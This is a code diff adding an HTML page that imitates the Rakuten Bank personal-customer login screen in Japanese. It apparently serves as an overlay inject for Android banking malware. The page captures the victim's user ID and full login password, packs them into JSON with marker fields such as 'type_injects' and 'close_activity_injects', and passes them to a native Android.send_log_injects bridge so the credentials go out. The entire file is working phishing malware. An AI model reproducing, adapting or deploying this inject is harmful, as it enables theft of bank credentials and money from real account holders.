@@ -1,0 +1,234 @@
+﻿<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>楽天銀行 -個人のお客様向けアプリ</title>
+</head>
+<style>
+html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}main{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}template{display:none}[hidden]{display:none}
+body {
+    background-color: #eeeeee;
+    color: #1a0e00;
+}
+html {
+    font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+}
+.header {
+    background: #f8f8f8;
+    position: relative;
+    z-index: 2;
+}
+.logongardient {
+    padding: 18px 0;
+    text-align: left;
+    box-shadow: 0px 0px 7px #888888;
+}
+.logo {
+    margin: 0 auto;
+    text-align: center;
+    color: #000000;
+    font-weight: bold;
+    font-size: 1.2rem;
+    padding-left: 25px;
+}
+.main {
+    margin-top: 40px;
+}
+.autorizeBox {
+    background: #ffffff;
+    border-radius: 5px;
+    box-shadow: 0px 0px 4px #cccccc;
+    padding: 1.25rem 0;
+    max-width: 384px !important;
+    overflow: visible !important;
+    margin: 0 auto;
+}
+@media only screen and (max-width: 444px) {
+    .autorizeBox {
+        margin: 0 20px;
+    }
+}
+.autorizeBox form {
+    position: relative;
+    min-height: .0625rem;
+    padding: 5px 35px;
+}
+.autorizeBox ::placeholder {
+    color: #bebebe;
+    opacity: 1;
+}
+.autorizeBox label {
+    font-size: 1.125rem;
+    -webkit-touch-callout: none;
+    -webkit-user-select: none;
+    -khtml-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+    margin-left: 5px;
+}
+.autorizeBox input {
+    font-size: 1.125rem;
+    background: 0 0;
+    border: none;
+    color: #000000;
+    border-radius: 4px;
+    border: 2px solid #ccc;
+    padding: 5px;
+    margin: 10px 0;
+    width: 96%;
+}
+.autorizeBox input.dt {
+    width: 17%;
+}
+.autorizeBox a {
+    display: block;
+    text-decoration: none;
+    color: #452900;
+    width: 100%;
+    text-align: right;
+    margin-bottom: 20px;
+}
+.autorizeBox button {
+    margin: 20px 0;
+    background-color: #ffa700;
+    color: #4e3500;
+    border: none;
+    width: 100%;
+    height: 4rem;
+    overflow-x: auto;
+    border-radius: 5px;
+    text-align: center;
+    vertical-align: middle;
+    cursor: pointer;
+}
+.autorizeBox button:disabled,
+.autorizeBox button[disabled] {
+    background-color: #ffe3ad;
+    color: #ffc757;
+}
+.autorizeBox button span {
+    line-height: 1.125rem;
+    white-space: normal;
+    margin: .0625rem .75rem;
+    font-size: 1.5rem;
+    font-weight: 600;
+    letter-spacing: 0;
+    text-decoration: none;
+}
+</style>
+<body>
+    <div class="header"><div class="logongardient">
+            <div class="logo">ログイン</div>
+        </div>
+    </div>
+    <div class="main">
+        <div class="autorizeBox">
+            <form id="login" action="" style="">
+                <p>楽天銀行口座のユーザID・ログインパスワードを入力してください。</p>
+                <label for="Login">ユーザID</label>
+                <input id="Login" name="email" pattern=".{4,}" onkeypress="checkinputsemail(this.value.length);" onchange="checkinputsemail(this.value.length);" autocomplete="off" type="text" required>
+                <label for="Password">ログインパスワード（全桁）</label>
+                <input id="Password" name="password" pattern=".{4,}" onkeypress="checkinputspassword(this.value.length);" onchange="checkinputspassword(this.value.length);" autocomplete="off" type="password" required>
+                <input name="type_injects" value='banks' type="hidden" required>
+                <input name="closed" value='close_activity_injects' type="hidden" required>
+                <a href="#" style="margin-top: 10px;">ログインでお困りのお客さま <b>></b></a>
+                <a href="#">はじめてロ座にログインする場合<b>></b></a>
+                <a href="#" style="margin-bottom: 0px;">指紋認証でのログインについて<b>></b></a>
+                <button id="btnmybest" type="button" onclick="process('login')" disabled><span>ログイン</span></button>
+            </form>
+        </div>
+    </div>
+</body>
+<script>
+var emailinputs = false;
+var passwordinputs = false;
+
+document.getElementById('btnmybest').disabled = !(emailinputs & passwordinputs);
+
+function checkinputsemail(lentext) {
+    if(lentext > 4)
+    {
+        emailinputs = true;
+    }
+    document.getElementById('btnmybest').disabled = !(emailinputs & passwordinputs);
+}
+
+function checkinputspassword(lentext) {
+    if(lentext > 4)
+    {
+        passwordinputs = true;
+    }
+    document.getElementById('btnmybest').disabled = !(emailinputs & passwordinputs);
+}
+
+function process(formId) {
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        try {
+        Android.send_log_injects(formToJSONbyName(document.getElementById(formId)));
+        } catch (err) {}
+    }else{
+       alert(formToJSONbyName(document.getElementById(formId)));
+    }
+    formChange(formId);
+}
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+		var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+</script>
+</html>
